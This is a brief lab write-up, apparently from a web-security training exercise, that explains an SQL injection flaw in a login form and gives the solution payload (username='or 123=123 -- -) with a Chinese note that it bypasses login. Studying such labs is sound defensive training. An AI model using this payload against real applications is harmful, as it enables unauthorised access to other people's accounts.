# Lab: SQL injection vulnerability allowing login bypass

This lab contains an SQL injection vulnerability in the login function.

To solve the lab, perform an SQL injection attack that logs in to the application as the administrator user.

## SQL injection
* 要繞過登入驗證
```
payload = username='or 123=123 -- - &password=123
```